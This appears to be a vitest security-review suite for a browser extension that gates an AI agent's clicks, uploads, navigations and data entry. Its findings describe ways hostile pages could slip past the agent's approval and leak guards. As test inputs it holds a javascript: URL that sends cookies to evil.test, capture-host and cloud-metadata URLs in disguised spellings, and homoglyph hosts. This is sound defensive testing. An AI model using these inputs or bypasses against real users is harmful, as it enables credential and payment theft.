/**
 * Independent enforcement review of the decision engine and the worker
 * (lane/engine-review). Every test states the correct behaviour. A test marked
 * `it.fails` is a finding: the code does the wrong thing today, and the one-line
 * reason says what. When a finding is fixed its `it.fails` starts failing; turn
 * it into a plain `it`.
 *
 * Finding ids (BR1..) match the review report.
 */
import { afterEach, describe, expect, it, vi } from "vitest";
import { agentModeOffProof, agentModeOffSnapshot, ApprovalLedger } from "../../src/engine/bindings.js";
import { hostOf, registrableDomain, sameSite } from "../../src/engine/domain.js";
import { actionFingerprint, snapshotOf, type ActionSnapshot } from "../../src/engine/fingerprint.js";
import { decideLeak } from "../../src/engine/leak.js";
import { decideNavigation } from "../../src/engine/navigation.js";
import { printsFor, seenElsewhere } from "../../src/engine/private-data.js";
import { decide } from "../../src/engine/rules.js";
import { effectiveTrust, emptyState, endAgentSession, grantKey, pageShown, privateDataShown, startAgentSession, tabClosed, tabOpened, topLevelNavigated, type AgentModeOffProof } from "../../src/engine/session.js";
import { activate, agentTrust, ctx, download, frame, realLookingCard, submit, trust, upload } from "../../src/engine/test-helpers.js";
import { DEFAULT_POLICY, type NormalizedAction, type Policy } from "../../src/engine/types.js";
import { buildManifest, EXTENSION_PAGES_CSP } from "../../src/manifest.js";
import type * as LogModule from "../../src/worker/log.js";
import { LIMITS, parseContentMessage, parseUiMessage, type GateReply, type LeakReply, type RedeemReply, type UiState } from "../../src/shared/messages.js";

const P: Policy = DEFAULT_POLICY;
const OTP_PAGE = "Your Google verification code is 482913. Do not share it.";
/** A GitHub-token-shaped value that is not a published test value. */
const GH_TOKEN = `ghp_${"R8mK2vQ9xL4nT7pW3sZ6yB1cD5fH0jG8kN2aQ".slice(0, 36)}`;

// ---------------------------------------------------------------------------
// 1. Gate: page-controlled fields must not lower a verdict
// ---------------------------------------------------------------------------

const SALT = "test-session-salt";

describe("gate: page-controlled fields", () => {
  const grantShop = agentTrust({ grants: new Set([grantKey("shop.test", "payment")]), sessionDomains: new Set(["shop.test", "evil.test"]) });

  it("a session grant for shop.test does not cover a button in an evil.test frame", () => {
    const a = activate("Place order", { frame: frame("https://evil.test", 1, 1), context: ctx("https://evil.test/") });
    expect(decide(a, grantShop, P).verdict).toBe("approve");
  });

  it("a session grant applies on the granted site itself", () => {
    const a = submit([], { label: "Place order", frame: frame("https://shop.test", 1, 0), form: { fields: [], targetUrl: "https://shop.test/order", method: "post" } });
    expect(decide(a, grantShop, P).verdict).toBe("allow");
  });

  // BR3
  it("BR3: a session grant for shop.test does not cover an evil.test form whose action points at shop.test", () => {
    // Fixed by lane/leakgate; was: targetHostOf uses the page-controlled form action, so evil.test borrows shop.test's grant.
    const a = submit([], { label: "Place order", frame: frame("https://evil.test", 1, 1), form: { fields: [], targetUrl: "https://shop.test/order", method: "post" }, context: ctx("https://evil.test/") });
    expect(decide(a, grantShop, P).verdict).toBe("approve");
  });

  it("an upload in a frame of a domain new to the session needs approval", () => {
    const u = upload({ frame: frame("https://evil.test", 1, 1), context: ctx("https://evil.test/") });
    expect(decide(u, agentTrust({ sessionDomains: new Set(["shop.test"]) }), P).verdict).toBe("approve");
  });

  // BR4
  it("BR4: an upload's 'new target' test is not satisfied by a page-controlled form action", () => {
    // Fixed by lane/leakgate; was: upload targetUrl (the form action, decorative for script uploads) decides 'known target'; evil.test is never checked.
    const u = upload({ frame: frame("https://evil.test", 1, 1), targetUrl: "https://shop.test/upload", context: ctx("https://evil.test/") });
    expect(decide(u, agentTrust({ sessionDomains: new Set(["shop.test"]) }), P).verdict).toBe("approve");
  });

  it("grants never apply to consent or account security, and never lift a quarantine deny", () => {
    const t = agentTrust({ grants: new Set([grantKey("shop.test", "account_security"), grantKey("shop.test", "oauth_consent"), grantKey("shop.test", "payment")]) });
    expect(decide(activate("Change password", { frame: frame("https://shop.test") }), t, P).verdict).toBe("approve");
    expect(decide(activate("Place order", { frame: frame("https://shop.test") }), { ...t, quarantined: true }, P).verdict).toBe("deny");
  });

  it("frame origins with userinfo, ports, trailing dots and homoglyph hosts do not match a grant they should not", () => {
    const grantPaypal = agentTrust({ grants: new Set([grantKey("paypal.com", "payment")]) });
    // userinfo is not the host
    expect(decide(activate("Pay now", { frame: frame("https://paypal.com@evil.test") }), grantPaypal, P).verdict).toBe("approve");
    // Cyrillic 'а' in pаypal.com is a different (punycode) host
    expect(decide(activate("Pay now", { frame: frame("https://pаypal.com") }), grantPaypal, P).verdict).toBe("approve");
    expect(decide(activate("Pay now", { frame: frame("https://paypal.com.evil.test") }), grantPaypal, P).verdict).toBe("approve");
    // a port and a trailing dot are still the granted site
    expect(decide(activate("Pay now", { frame: frame("https://www.paypal.com.:8443") }), grantPaypal, P).verdict).toBe("allow");
  });

  it("an OAuth-endpoint lookalike host or a consent path on any host is still gated", () => {
    const a = activate("Allow", { context: ctx("https://accounts.google.com.evil.test/o/oauth2/auth?client_id=x") });
    expect(decide(a, trust(), P).verdict).toBe("approve");
    const b = activate("Authorize", { context: ctx("https://evil.test/oauth/authorize?client_id=x") });
    expect(decide(b, trust(), P).verdict).toBe("approve");
  });

  // BR10
  it("BR10: a payment control written as <a href=\"#\"> (with card fields, or in a payment frame) is still a payment", () => {
    // Fixed by lane/leakgate; was: any <a> with a non-javascript: href returns unclassified before card-field and payment-frame signals are read.
    const card = [{ name: "cc", type: "text", autocomplete: "cc-number", value: realLookingCard() }];
    const a = activate("Buy now", { tag: "a", role: "link", href: "https://shop.test/checkout#", context: ctx("https://shop.test/checkout", { formFields: card }) });
    expect(decide(a, agentTrust(), P).verdict).toBe("approve");
    const b = activate("Pay", { tag: "a", role: "link", href: "https://js.stripe.com/v3/#", frame: frame("https://js.stripe.com", 1, 3) });
    expect(decide(b, agentTrust(), P).verdict).toBe("approve");
  });

  // BR11
  it("BR11: labels with a no-break space or zero-width character still classify", () => {
    // Fixed by lane/leakgate; was: label regexes match literal ASCII spaces; innerText of 'Place&nbsp;order' has U+00A0 and is unclassified.
    expect(decide(activate("Place order"), agentTrust(), P).verdict).toBe("approve");
    expect(decide(activate("Pl​ace order"), agentTrust(), P).verdict).toBe("approve");
  });

  it("executable downloads are gated regardless of case or a decoy extension", () => {
    expect(decide(download("Setup.EXE"), trust(), P).verdict).toBe("approve");
    expect(decide(download("invoice.pdf.exe"), trust(), P).verdict).toBe("approve");
    expect(decide(download("tool.dmg"), agentTrust(), P).verdict).toBe("approve");
    expect(decide({ kind: "download", url: "https://evil.test/payload.exe", filename: "notes.txt", mime: "text/plain" }, trust(), P).verdict).toBe("approve");
  });

  // BR12
  it("BR12: an executable name with a trailing dot or space, or an executable MIME with parameters, is still gated", () => {
    // Fixed by lane/leakgate; was: the extension regex needs the name to end in the extension, and the MIME regex is anchored with no parameters.
    expect(decide(download("setup.exe."), trust(), P).verdict).toBe("approve");
    expect(decide(download("setup.exe "), trust(), P).verdict).toBe("approve");
    expect(decide(download("download", "application/x-msdownload; charset=binary"), trust(), P).verdict).toBe("approve");
  });
});

// ---------------------------------------------------------------------------
// 2. Leak guard: destinations and page-declared merchants
// ---------------------------------------------------------------------------

describe("leak guard", () => {
  it("a card to a payment-provider lookalike host, or to a lookalike of the merchant, is a finding", () => {
    const card = realLookingCard();
    expect(decideLeak({ text: card, destinationHost: "js.stripe.com.evil.test" }, agentTrust(), P).decision.verdict).toBe("approve");
    expect(decideLeak({ text: card, destinationHost: "shop.test.evil.test", checkoutMerchantHost: "shop.test" }, agentTrust(), P).decision.verdict).toBe("approve");
  });

  it("a base64-encoded secret to a new host is still a secret", () => {
    expect(decideLeak({ text: btoa(GH_TOKEN), destinationHost: "evil.test" }, agentTrust(), P).decision.rule).toBe("leak.secret");
  });

  it("a private string seen on mail, typed on a quarantined untrusted tab in agent mode, is denied", () => {
    const prints = printsFor(OTP_PAGE, "mail.google.com", SALT);
    const d = decideLeak({ text: "482913", destinationHost: "evil.test" }, agentTrust({ prints, printSalt: SALT, untrusted: true, quarantined: true }), P);
    expect(d.decision.verdict).toBe("deny");
  });

  // BR9
  it("BR9: a page cannot make itself the 'merchant' of a checkout to receive a card without approval", () => {
    // Fixed by lane/leakgate; was: checkoutMerchantHost comes from the page's own classification; destination == merchant clears the card rule.
    const d = decideLeak({ text: realLookingCard(), destinationHost: "evil.test", checkoutMerchantHost: "evil.test" }, agentTrust({ untrusted: true }), P);
    expect(d.decision.verdict).toBe("approve");
  });
});

// ---------------------------------------------------------------------------
// 3. Navigation policy
// ---------------------------------------------------------------------------

describe("navigation policy", () => {
  it("capture hosts are caught through case, trailing dots, ports, userinfo and fullwidth spelling", () => {
    for (const url of ["https://WEBHOOK.SITE./x", "https://u:p@webhook.site:8443/x", "https://ｗｅｂｈｏｏｋ.site/x"]) {
      expect(decideNavigation({ url, resourceType: "main_frame" }, agentTrust(), P).verdict, url).toBe("deny");
      expect(decideNavigation({ url, resourceType: "other" }, trust(), P).verdict, url).toBe("deny");
    }
  });

  it("metadata addresses in decimal or hex spelling are blocked for subresources", () => {
    for (const url of ["http://2852039166/latest/", "http://0xa9.0xfe.0xa9.0xfe/latest/", "http://169.254.169.254./latest/"]) {
      expect(decideNavigation({ url, resourceType: "other" }, trust(), P).verdict, url).toBe("deny");
    }
  });

  it("premise: the URL parser treats control-prefixed and tab-split schemes as javascript:", () => {
    expect(new URL("\u0001javascript:fetch(1)").protocol).toBe("javascript:");
    expect(new URL("java\tscript:fetch(1)").protocol).toBe("javascript:");
  });

  // BR6
  it("BR6: javascript: URLs with leading control characters or embedded tabs/newlines are denied as top-level navigations in agent mode", () => {
    // Fixed by lane/domains; was: the scheme regex reads the raw string, so these fall through to 'not_web_url' and are allowed.
    expect(decideNavigation({ url: "\u0001javascript:fetch('//evil.test/'+document.cookie)", resourceType: "main_frame" }, agentTrust(), P).verdict).toBe("deny");
    expect(decideNavigation({ url: "java\nscript:fetch('//evil.test/')", resourceType: "main_frame" }, agentTrust(), P).verdict).toBe("deny");
  });

  // BR13
  it("BR13: an IPv4-mapped IPv6 spelling of the metadata address is blocked for subresources", () => {
    // Fixed by lane/domains; was: [::ffff:169.254.169.254] parses to [::ffff:a9fe:a9fe], which isMetadataEndpoint does not recognise.
    expect(decideNavigation({ url: "http://[::ffff:169.254.169.254]/latest/meta-data/", resourceType: "other" }, trust(), P).verdict).toBe("deny");
  });

  // BR14
  it("BR14: a URL the strict parser cannot read fails closed, not open", () => {
    // Fixed by lane/domains; was: parseUrlLike rejects any whitespace and decideNavigation then allows ('unparsed'), even for a capture host.
    expect(decideNavigation({ url: "https://webhook.site/?d=a b", resourceType: "other" }, agentTrust(), P).verdict).toBe("deny");
  });
});

// ---------------------------------------------------------------------------
// 4. Registrable domains
// ---------------------------------------------------------------------------

describe("registrable domain", () => {
  it("keeps distinct owners apart under the bundled suffixes", () => {
    const pairs: [string, string][] = [
      ["attacker.example", "target.example"],
      ["attacker.co.uk", "target.co.uk"],
      ["attacker.com.au", "target.com.au"],
      ["evil.github.io", "victim.github.io"],
      ["evil.pages.dev", "victim.pages.dev"],
      ["evil.vercel.app", "victim.vercel.app"],
      ["evil.s3.amazonaws.com", "victim.s3.amazonaws.com"],
      ["evil.github.io", "github.io"],
      ["xn--pple-43d.com", "apple.com"],
      ["target.example.attacker.example", "target.example"],
    ];
    for (const [a, b] of pairs) expect(sameSite(a, b), `${a} vs ${b}`).toBe(false);
  });

  it("joins subdomains, case, trailing dots and ports of one owner", () => {
    expect(sameSite("a.b.target.co.uk", "target.co.uk")).toBe(true);
    expect(sameSite("TARGET.EXAMPLE.", "www.target.example")).toBe(true);
    expect(hostOf("https://target.example@attacker.example:8443/")).toBe("attacker.example");
    expect(sameSite("", "")).toBe(false);
    expect(registrableDomain("WWW.Target.Example.")).toBe("target.example");
  });

  // BR7
  it("BR7a: regional and website S3 endpoints keep each bucket apart", () => {
    // Fixed by lane/domains; was: only s3.amazonaws.com is listed; every bucket.s3.<region>.amazonaws.com collapses to amazonaws.com.
    expect(sameSite("evil.s3.us-east-1.amazonaws.com", "victim.s3.us-east-1.amazonaws.com")).toBe(false);
    expect(sameSite("evil.s3-website-us-east-1.amazonaws.com", "victim.s3-website-us-east-1.amazonaws.com")).toBe(false);
  });

  it("BR7b: common app-hosting suffixes keep each tenant apart", () => {
    // Fixed by lane/domains; was: supabase.co, deno.dev, surge.sh, r2.dev and azurestaticapps.net are not in the bounded list.
    for (const s of ["supabase.co", "deno.dev", "surge.sh", "r2.dev", "azurestaticapps.net"]) expect(sameSite(`evil.${s}`, `victim.${s}`), s).toBe(false);
  });

  it("BR7c: open second-level registries keep each registrant apart", () => {
    // Fixed by lane/domains; was: uk.com, us.com, eu.org, blog.br and kyoto.jp are public suffixes the rule treats as registrable domains.
    for (const s of ["uk.com", "us.com", "eu.org", "blog.br", "kyoto.jp"]) expect(sameSite(`evil.${s}`, `victim.${s}`), s).toBe(false);
  });

  // BR5
  it("BR5: an OTP shown in Gmail and typed into an attacker's Google Form or Apps Script page is seen elsewhere", () => {
    // Fixed by lane/domains (engine/domain.ts: the full Public Suffix List and tenant hosts keep docs/script.google.com apart from mail).
    const prints = printsFor(OTP_PAGE, "mail.google.com", SALT);
    expect(seenElsewhere("482913", "docs.google.com", prints, SALT)).not.toBeNull();
    expect(seenElsewhere("482913", "script.google.com", prints, SALT)).not.toBeNull();
  });
});

// ---------------------------------------------------------------------------
// 5. Tab trust and the agent session
// ---------------------------------------------------------------------------

describe("tab trust and the agent session", () => {
  it("trusted-host matching is not fooled by suffixes, prefixes, userinfo or homoglyphs", () => {
    const pol: Policy = { ...P, trustedHosts: ["bank.test"] };
    for (const url of ["https://bank.test.evil.test/", "https://evilbank.test/", "https://bank.test@evil.test/", "https://bаnk.test/"]) {
      expect(effectiveTrust(pageShown(emptyState(), 1, { url }, pol), 1).untrusted, url).toBe(true);
    }
    expect(effectiveTrust(pageShown(emptyState(), 1, { url: "https://WWW.BANK.TEST.:8443/" }, pol), 1).untrusted).toBe(false);
  });

  it("taint never clears within a session: navigation, closing the tab, later trusted pages", () => {
    let s = startAgentSession(emptyState(), { now: 0, tabIds: [1], printSalt: SALT });
    s = pageShown(s, 1, { url: "https://evil.test/", verdict: "quarantine" }, P);
    s = pageShown(s, 1, { url: "https://mail.google.com/" }, P);
    s = topLevelNavigated(s, 1);
    s = pageShown(s, 1, { url: "https://shop.test/", verdict: "deliver" }, P);
    expect(effectiveTrust(s, 1)).toMatchObject({ untrusted: true, private: true, quarantined: true });
    s = tabClosed(s, 1);
    expect(effectiveTrust(s, 5)).toMatchObject({ agentMode: true, untrusted: true, private: true, quarantined: true });
  });

  it("a tab opened by a session tab inherits its trust and joins the session", () => {
    let s = startAgentSession(emptyState(), { now: 0, tabIds: [1], printSalt: SALT });
    s = pageShown(s, 1, { url: "https://evil.test/", verdict: "quarantine" }, P);
    s = tabOpened(s, 2, 1);
    s = pageShown(s, 2, { url: "https://mail.google.com/" }, P);
    s = privateDataShown(s, 2, printsFor(OTP_PAGE, "mail.google.com", SALT));
    expect(s.tabs.find((t) => t.tabId === 2)).toMatchObject({ untrusted: true, quarantined: true, inSession: true });
    expect(effectiveTrust(s, 1).private).toBe(true);
    expect(effectiveTrust(s, 1).prints.length).toBeGreaterThan(0);
  });

  it("with agent mode off, a tab opened by an untrusted tab inherits untrusted", () => {
    let s = pageShown(emptyState(), 1, { url: "https://evil.test/", verdict: "flag" }, P);
    s = tabOpened(s, 2, 1);
    expect(effectiveTrust(s, 2).untrusted).toBe(true);
  });

  // BR1
  it("BR1a: a tab the agent opens without an opener (chrome.tabs.create) still feeds the session: private data and OTP prints count", () => {
    // Fixed by lane/session (engine/session.ts tabOpened: in agent mode every new tab joins the session; guard-nav records no-opener tabs).
    let s = startAgentSession(emptyState(), { now: 0, tabIds: [1], printSalt: SALT });
    s = pageShown(s, 1, { url: "https://evil.test/" }, P);
    s = tabOpened(s, 2);
    s = pageShown(s, 2, { url: "https://mail.google.com/" }, P);
    s = privateDataShown(s, 2, printsFor(OTP_PAGE, "mail.google.com", SALT));
    const t = effectiveTrust(s, 1);
    expect(t.private).toBe(true);
    expect(decideLeak({ text: "482913", destinationHost: "evil.test" }, t, P).decision.verdict).toBe("approve");
  });

  it("BR1b: in agent mode a quarantine on a non-session tab does not clear when that tab navigates", () => {
    // Fixed by lane/session (engine/session.ts topLevelNavigated: in agent mode no quarantine clears, in any tab).
    let s = startAgentSession(emptyState(), { now: 0, tabIds: [1], printSalt: SALT });
    s = tabOpened(s, 2);
    s = pageShown(s, 2, { url: "https://evil.test/", verdict: "quarantine" }, P);
    s = topLevelNavigated(s, 2);
    expect(decide(activate("Place order", { frame: frame("https://shop.test", 2, 0) }), effectiveTrust(s, 2), P).verdict).toBe("deny");
  });

  // BR2
  it("BR2: tabOpened arriving after the new tab's first page report does not wipe that tab's flags", () => {
    // Fixed by lane/guard (engine/session.ts: tabOpened keeps the opened tab's existing flags), so no longer it.fails.
    let s = startAgentSession(emptyState(), { now: 0, tabIds: [1], printSalt: SALT });
    s = pageShown(s, 1, { url: "https://news.test/" }, P);
    s = pageShown(s, 2, { url: "https://evil.test/", verdict: "quarantine" }, P);
    s = tabOpened(s, 2, 1);
    expect(effectiveTrust(s, 2).quarantined).toBe(true);
  });

  // BR15
  it("BR15: a blob: frame minted by evil.test counts as outside content", () => {
    // Fixed by lane/domains; was: hostOf(blob:https://evil.test/...) is null, so pageShown records nothing for blob: (and data:, about:srcdoc) frames.
    expect(effectiveTrust(pageShown(emptyState(), 1, { url: "blob:https://evil.test/6f1c0a52-0000-4000-8000-000000000000" }, P), 1).untrusted).toBe(true);
  });

  it("ending the session refuses without a proof, with a wrong purpose, or with a falsy ok", () => {
    const s = startAgentSession(emptyState(), { now: 0, tabIds: [1], printSalt: SALT });
    expect(endAgentSession(s, null).ended).toBe(false);
    expect(endAgentSession(s, undefined).ended).toBe(false);
    expect(endAgentSession(s, { ok: true, purpose: "action" } as unknown as AgentModeOffProof).ended).toBe(false);
    expect(endAgentSession(s, { ok: "true", purpose: "agent_mode_off" } as unknown as AgentModeOffProof).ended).toBe(false);
  });

  // BR16
  it("BR16: endAgentSession accepts only a proof minted by a redeemed approval", () => {
    // Fixed by lane/session (engine/bindings.ts mints the proof from a redeemed approval; endAgentSession checks it by identity).
    const s = startAgentSession(emptyState(), { now: 0, tabIds: [1], printSalt: SALT });
    expect(endAgentSession(s, { ok: true, purpose: "agent_mode_off" }).ended).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 6. Approval bindings
// ---------------------------------------------------------------------------

describe("approval bindings", () => {
  function ledger() {
    let t = 1_000;
    let n = 0;
    return { l: new ApprovalLedger({ now: () => t, randomId: () => `r${++n}${"0".repeat(30)}` }), advance: (ms: number) => (t += ms) };
  }
  const fields = [{ name: "amount", type: "text", value: "10" }];
  const pay = submit(fields, { label: "Pay", frame: frame("https://bank.test", 7, 0), form: { fields, targetUrl: "https://bank.test/pay?to=alice", method: "post" } });
  const snap = snapshotOf(pay, "payment");

  it("the approval id is not a token, and a token approves once", () => {
    const { l } = ledger();
    const rec = l.request(snap);
    expect(l.redeem(rec.id, snap)).toEqual({ ok: false, reason: "unknown_token" });
    const token = l.approve(rec.id) as string;
    expect(l.approve(rec.id)).toBeNull();
    expect(l.redeem(token, snap).ok).toBe(true);
    expect(l.redeem(token, snap).ok).toBe(false);
  });

  it("a token cannot move to another tab, frame or origin, and a failed attempt burns it", () => {
    for (const presented of [{ ...snap, tabId: 8 }, { ...snap, frameId: 1 }, { ...snap, frameOrigin: "https://evil.test" }, { ...snap, elementPath: "html>body>form:nth-of-type(2)" }]) {
      const { l } = ledger();
      const token = l.approve(l.request(snap).id) as string;
      expect(l.redeem(token, presented).ok).toBe(false);
      expect(l.redeem(token, snap)).toEqual({ ok: false, reason: "used" });
    }
  });

  it("an action token cannot end agent mode and an agent-mode-off token cannot replay an action", () => {
    const { l } = ledger();
    const t1 = l.approve(l.request(snap).id) as string;
    const r1 = l.redeem(t1, agentModeOffSnapshot(), "agent_mode_off");
    expect(r1.ok).toBe(false);
    expect(agentModeOffProof(r1)).toBeNull();
    const t2 = l.approve(l.request(agentModeOffSnapshot(), "agent_mode_off").id) as string;
    expect(l.redeem(t2, agentModeOffSnapshot(), "action")).toEqual({ ok: false, reason: "wrong_purpose" });
  });

  it("a denied or navigated-away approval cannot be redeemed, and a restored ledger does not revive spent tokens", () => {
    const { l } = ledger();
    const a = l.request(snap);
    const ta = l.approve(a.id) as string;
    l.deny(a.id);
    expect(l.redeem(ta, snap).ok).toBe(false);
    const b = l.request(snap);
    const tb = l.approve(b.id) as string;
    l.expireTab(7);
    expect(l.redeem(tb, snap).ok).toBe(false);
    const c = l.request(snap);
    const tc = l.approve(c.id) as string;
    expect(l.redeem(tc, snap).ok).toBe(true);
    const restored = new ApprovalLedger({ now: () => 1_000, randomId: () => "x".repeat(32) }, l.toJSON());
    expect(restored.redeem(tc, snap).ok).toBe(false);
    expect(restored.redeem(ta, snap).ok).toBe(false);
  });

  it("an approval expires after its TTL", () => {
    const { l, advance } = ledger();
    const token = l.approve(l.request(snap).id) as string;
    advance(5 * 60 * 1000);
    expect(l.redeem(token, snap)).toEqual({ ok: false, reason: "expired" });
  });

  it("changing a form's field values or method changes the binding", () => {
    const changed = submit([{ name: "amount", type: "text", value: "1000" }], { label: "Pay", frame: frame("https://bank.test", 7, 0), form: { fields: [{ name: "amount", type: "text", value: "1000" }], targetUrl: "https://bank.test/pay?to=alice", method: "post" } });
    expect(actionFingerprint(snapshotOf(changed, "payment"))).not.toBe(actionFingerprint(snap));
    expect(actionFingerprint({ ...snap, method: "GET" })).not.toBe(actionFingerprint(snap));
  });

  // BR8
  it("BR8a: an approved activation is bound to the control's label and compose contents, not only its path", () => {
    // Fixed by lane/leakgate; was: the activate snapshot holds no label and no compose state; an SPA can retarget 'Send' after approval.
    const a = activate("Send to alice@mail.test", { frame: frame("https://mail.test", 1, 0), context: ctx("https://mail.test/", { compose: { hasRecipient: true, hasBody: true } }) });
    const b = { ...a, label: "Send to mallory@evil.test" } satisfies NormalizedAction;
    expect(actionFingerprint(snapshotOf(b, "send"))).not.toBe(actionFingerprint(snapshotOf(a, "send")));
  });

  it("BR8b: an approved submit is bound to the full target URL, not only its origin", () => {
    // Fixed by lane/leakgate; was: targetOrigin drops path and query, so 'pay?to=alice' approved replays as 'pay?to=mallory'.
    const moved = submit(fields, { label: "Pay", frame: frame("https://bank.test", 7, 0), form: { fields, targetUrl: "https://bank.test/pay?to=mallory", method: "post" } });
    expect(actionFingerprint(snapshotOf(moved, "payment"))).not.toBe(actionFingerprint(snap));
  });
});

// ---------------------------------------------------------------------------
// 7. Message parsers
// ---------------------------------------------------------------------------

describe("message parsers", () => {
  const fr = { tabId: 1, frameId: 0, origin: "https://x.test" };
  const c = { pageUrl: "https://x.test/" };
  const act = (over: Record<string, unknown>) => ({ type: "action.check", action: { kind: "activate", frame: fr, elementPath: "button", label: "Go", role: "button", tag: "button", context: c, ...over } });

  it("accepts a well-formed message", () => {
    expect(parseContentMessage(act({}))).not.toBeNull();
  });

  it("rejects malformed, mistyped and oversized messages", () => {
    const bad: unknown[] = [
      null,
      [],
      "action.check",
      { type: "nope" },
      act({ kind: "navigate" }),
      act({ kind: "download" }),
      act({ label: "x".repeat(LIMITS.label + 1) }),
      act({ elementPath: 7 }),
      act({ context: { pageUrl: "x".repeat(LIMITS.url + 1) } }),
      act({ context: { pageUrl: "https://x.test/", formFields: Array.from({ length: LIMITS.fields + 1 }, () => ({ name: "a", type: "text" })) } }),
      act({ frame: { ...fr, tabId: 1.5 } }),
      { type: "action.check", action: { kind: "upload", frame: fr, elementPath: "i", context: c, files: Array.from({ length: LIMITS.files + 1 }, () => ({ name: "a", size: 1, type: "" })) } },
      { type: "action.check", action: { kind: "upload", frame: fr, elementPath: "i", context: c, files: [{ name: "a", size: Number.NaN, type: "" }] } },
      { type: "frame.hello", url: "x".repeat(LIMITS.url + 1), top: true },
      { type: "frame.hello", url: "https://x.test/", top: "yes" },
      { type: "page.scanned", url: "https://x.test/", verdict: "allow", reasons: [], scanIncomplete: false },
      { type: "page.scanned", url: "https://x.test/", verdict: "flag", reasons: Array.from({ length: LIMITS.reasons + 1 }, () => "r"), scanIncomplete: false },
      { type: "leak.guard", via: "beacon", text: "a", destinationHost: "x.test", elementPath: "", fieldName: "" },
      { type: "leak.guard", via: "type", text: "x".repeat(LIMITS.text + 1), destinationHost: "x.test", elementPath: "", fieldName: "" },
      { type: "private.prints", prints: Array.from({ length: LIMITS.prints + 1 }, () => ({ fp: "a", kind: "long", domain: "x.test" })) },
      { type: "private.prints", prints: [{ fp: "a", kind: "medium", domain: "x.test" }] },
      { type: "approval.redeem", token: "", snapshot: agentModeOffSnapshot() },
      { type: "approval.redeem", token: "t".repeat(LIMITS.token + 1), snapshot: agentModeOffSnapshot() },
      { type: "approval.redeem", token: "t", snapshot: { ...agentModeOffSnapshot(), actionClass: "teleport" } },
    ];
    for (const m of bad) expect(parseContentMessage(m), JSON.stringify(m)?.slice(0, 80)).toBeNull();
    for (const m of [null, { type: "ui.agentMode", on: "false" }, { type: "ui.approve", approvalId: "" }, { type: "ui.approve" }, { type: "action.check" }]) expect(parseUiMessage(m)).toBeNull();
  });

  // BR17
  it("BR17a: a message's total payload is bounded, not only each string", () => {
    // Fixed by lane/session (shared/messages.ts withinMessageBounds: a total bound across every string).
    const big = "a".repeat(LIMITS.text);
    const fields = Array.from({ length: 4 }, (_, i) => ({ name: `f${i}`, type: "text", value: big }));
    const m = { type: "action.check", action: { kind: "submit", frame: fr, elementPath: "form", form: { fields, targetUrl: "https://x.test/", method: "post" }, context: { pageUrl: "https://x.test/", formFields: fields } } };
    expect(parseContentMessage(m)).toBeNull();
  });

  it("BR17b: a file size of Infinity is rejected", () => {
    // Fixed by lane/session (shared/messages.ts: file sizes must be finite).
    expect(parseContentMessage({ type: "action.check", action: { kind: "upload", frame: fr, elementPath: "i", context: c, files: [{ name: "a", size: Infinity, type: "" }] } })).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// 8. Manifest
// ---------------------------------------------------------------------------

describe("manifest matches the design", () => {
  const m = buildManifest({ version: "0.0.1" }) as unknown as Record<string, unknown>;
  it("install permissions, host access, no external surface, no remote code", () => {
    expect([...(m.permissions as string[])].sort()).toEqual(["declarativeNetRequest", "downloads", "sidePanel", "storage", "webNavigation"]);
    expect(m.host_permissions).toEqual(["<all_urls>"]);
    for (const k of ["optional_host_permissions", "externally_connectable", "web_accessible_resources", "key", "update_url"]) expect(m[k], k).toBeUndefined();
    // The native link's permission, optional only (requested from the side panel's switch).
    expect(m.optional_permissions).toEqual(["nativeMessaging"]);
    expect((m.content_security_policy as { extension_pages: string }).extension_pages).toBe(EXTENSION_PAGES_CSP);
    expect(EXTENSION_PAGES_CSP).toContain("script-src 'self'");
    expect(EXTENSION_PAGES_CSP).not.toMatch(/unsafe|https?:/);
    const cs = (m.content_scripts as Record<string, unknown>[])[0] as Record<string, unknown>;
    expect(cs).toMatchObject({ matches: ["<all_urls>"], run_at: "document_start", all_frames: true, match_origin_as_fallback: true });
    for (const p of ["tabs", "scripting", "webRequest", "webRequestBlocking", "cookies", "history", "debugger", "nativeMessaging", "management", "clipboardRead"]) expect(m.permissions as string[]).not.toContain(p);
  });
});

// ---------------------------------------------------------------------------
// 9. Worker, through a fake chrome: sender is the only source of tab, frame and origin
// ---------------------------------------------------------------------------

const EXT = "abcdefghijklmnopabcdefghijklmnop";
const DROPPED = Symbol("dropped");

interface FakeSender {
  id?: string;
  url?: string;
  origin?: string;
  tab?: { id?: number; url?: string; windowId?: number };
  frameId?: number;
}
type Listener = (raw: unknown, sender: FakeSender, sendResponse: (r: unknown) => void) => boolean;

interface Worker {
  send(raw: unknown, sender: FakeSender): Promise<unknown>;
  offerDownload(item: { id: number; url: string; finalUrl?: string; filename: string; mime?: string; byExtensionId?: string; tabId?: number }): boolean | undefined;
  downloaded: { url: string; conflictAction?: string }[];
  sent: { tabId: number; msg: unknown; opts?: { frameId?: number } }[];
  accessLevels: unknown[];
  localAccessLevels: unknown[];
  stored(): { tabs: unknown[]; session: { prints: { domain: string }[]; printSalt?: string } | null };
}

const ui: FakeSender = { id: EXT, url: `chrome-extension://${EXT}/sidepanel.html`, origin: `chrome-extension://${EXT}` };
function cs(tabId: number, frameId: number, url: string): FakeSender {
  return { id: EXT, tab: { id: tabId }, frameId, url, origin: new URL(url).origin };
}

async function bootWorker(activeTabs: number[] = [1]): Promise<Worker> {
  vi.resetModules();
  // Integration: the decision log is IndexedDB in the extension; Node has none, so the worker gets the in-memory backend.
  vi.doMock("../../src/worker/log.js", async (importOriginal) => {
    const m = await importOriginal<typeof LogModule>();
    return { ...m, createIdbBackend: () => m.createMemoryBackend() };
  });
  const data = new Map<string, unknown>();
  const local = new Map<string, unknown>();
  let listener: Listener | undefined;
  let downloadListener: ((item: Parameters<Worker["offerDownload"]>[0], suggest: () => void) => boolean | undefined) | undefined;
  const downloaded: Worker["downloaded"] = [];
  const sent: Worker["sent"] = [];
  const accessLevels: unknown[] = [];
  const localAccessLevels: unknown[] = [];
  const noop = { addListener: () => undefined };
  const fake = {
    runtime: {
      id: EXT,
      onMessage: { addListener: (f: Listener) => void (listener = f) },
      // ui.changed broadcasts to extension pages (gate lane).
      sendMessage: () => Promise.resolve(),
      getURL: (p: string) => `chrome-extension://${EXT}/${p}`,
      getManifest: () => ({ version: "0.0.1" }),
      // The native link stays off here: no permission, so it never connects.
      connectNative: () => {
        throw new Error("no native messaging in this test");
      },
      lastError: undefined,
    },
    permissions: { contains: async () => false, onRemoved: noop },
    storage: {
      onChanged: noop,
      // Settings (leak lane).
      local: {
        get: async (k: string) => (local.has(k) ? { [k]: structuredClone(local.get(k)) } : {}),
